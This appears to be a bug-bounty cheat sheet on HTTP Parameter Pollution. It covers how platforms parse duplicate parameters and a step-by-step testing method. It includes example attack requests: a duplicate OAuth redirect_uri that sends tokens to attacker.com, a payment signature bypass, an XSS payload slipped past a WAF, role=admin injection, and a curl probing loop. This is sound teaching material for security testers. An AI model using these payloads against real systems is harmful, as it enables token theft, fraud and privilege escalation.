# HTTP Parameter Pollution (HPP)

## What It Is
Sending multiple values for the same parameter. Different servers/frameworks parse them differently, creating exploitable inconsistencies.

## How Different Platforms Handle Duplicate Parameters (BBB Ch.24)

| Technology | Behavior | Example |
|---|---|---|
| ASP.NET/IIS | Concatenates with comma | `color=red,blue` |
| PHP/Apache | Uses last value | `color=blue` |
| PHP/Zeus | Uses first value | `color=red` |
| JSP/Tomcat | Uses first value | `color=red` |
| Python/Flask | Returns list | `['red','blue']` |
| Ruby on Rails | Uses last value | `color=blue` |
| Perl/CGI | Uses first value | `color=red` |

## Server-Side HPP (BBB Ch.24)

### Basic Test
```
# Normal request:
GET /search?q=term&category=electronics

# HPP attack:
GET /search?q=term&category=electronics&category=malicious_value

# If backend sends parameters to another API:
# GET /internal-api?q=term&category=electronics&category=malicious_value
# Internal API may parse category differently
```

### HPP in OAuth Flows
```
# Normal OAuth authorization:
GET /oauth/authorize?
  client_id=LEGITIMATE_APP&
  redirect_uri=https://app.com/callback&
  scope=read&
  response_type=code

# HPP attack — duplicate redirect_uri:
GET /oauth/authorize?
  client_id=LEGITIMATE_APP&
  redirect_uri=https://app.com/callback&
  redirect_uri=https://attacker.com/steal&
  scope=read&
  response_type=code

# If OAuth server uses first redirect_uri for validation
# But application backend uses last redirect_uri for actual redirect
# → Token sent to attacker
```

### HPP in Signature Bypass
```
# API with signature verification:
GET /api/transfer?from=alice&to=bob&amount=100&sig=VALID_SIG

# HPP attack — if signature only covers first occurrence:
GET /api/transfer?from=alice&to=bob&amount=100&to=charlie&sig=VALID_SIG

# If processor uses last 'to' value → transfer goes to charlie
# But signature was calculated with 'to=bob' (first occurrence)
```

### HPP via URL Encoding
```
# Inject parameter separator via encoding:
# Normal:
GET /search?q=term

# HPP via encoded ampersand (%26):
GET /search?q=term%26admin=true

# Server may decode %26 → &admin=true → adds parameter
```

## Client-Side HPP (BBB Ch.24)

When user-controlled values end up in URLs that contain additional parameters:

### Link Injection via HPP
```
# Example: user controls "next" parameter
https://target.com/view?id=1&next=home

# If page generates a link like:
<a href="/action?id=1&next=USERINPUT&token=SECRET">

# Attacker inputs: home&token=REPLACED
# Generated link becomes:
<a href="/action?id=1&next=home&token=REPLACED&token=SECRET">

# If app uses first 'token' → CSRF token bypass
```

### Testing Client-Side HPP
1. Find parameters that are reflected in links on the page
2. Try injecting `&param=value` in the reflected parameter
3. Check if the injected parameter appears in links

## Common HPP Attack Scenarios

### Bypassing Duplicate Detection
```
# App prevents ordering same item twice:
POST /order
item_id=123&item_id=456&quantity=2

# If backend uses first item_id for quantity check
# But uses second item_id for the actual order
→ Bypasses "already ordered" check
```

### WAF Bypass via HPP
```
# WAF checks first occurrence only:
GET /search?q=normal_query&q=<script>alert(1)</script>

# If WAF passes the request (only sees first 'q')
# But backend uses second 'q' → XSS
```

### Mass Assignment via HPP
```
# API that updates user profile:
POST /api/users/me
name=Hacker&role=user

# HPP:
POST /api/users/me
name=Hacker&role=user&role=admin

# If framework merges duplicates as array/last:
# role might become ['user','admin'] or 'admin'
```

## Encoding Tricks for HPP

### URL Encoding of Separator Characters
```
# % encoding of & (%26):
?q=test%26admin=true → q="test" and admin="true" after decoding

# % encoding of = (%3D):
?q=test%3Dvalue → depends on server

# Double encoding:
?q=test%2526admin%253Dtrue → %25 = %, so after first decode: %26admin%3Dtrue
→ After second decode: &admin=true
```

## HPP Testing Methodology

### Step 1: Map All Parameters
```bash
# Collect all parameters in use
curl "https://target.com/search?q=test" -v

# Or use Burp to see all params
```

### Step 2: Duplicate Each Parameter
```bash
# Add a second value for each parameter
# Test with benign values first
?q=test&q=test2

# Then with potentially impactful values
?q=test&admin=true
?q=test&role=admin
?q=test&debug=true
```

### Step 3: Check Both Values in Different Positions
```bash
?legit_param=legit&malicious_param=malicious_value
?malicious_param=malicious_value&legit_param=legit
```

### Step 4: Test URL-Encoded Separators
```bash
?q=test%26role%3Dadmin
?q=test%2526role%253Dadmin  # double encoded
```

## HPP in Headers

Some apps reflect or pass through HTTP headers:
```
# Try:
GET / HTTP/1.1
Host: example.com
Host: evil.com

# Some reverse proxies may pass both or use wrong one
```

## Automated HPP Testing

```bash
# Burp: In Repeater, duplicate parameters
# Add "&PARAM=value" after each existing parameter

# Manual script
for param in admin role debug user_type permission; do
  curl -s "https://target.com/page?id=1&$param=true" -o /dev/null -w "$param: %{http_code}\n"
done
```

## Severity
- **Low (standalone)**: Server behaves unexpectedly but no security impact
- **Medium**: WAF bypass, information disclosure
- **High**: CSRF token bypass, OAuth token theft via redirect_uri HPP
- **High**: Signature bypass in payment flows
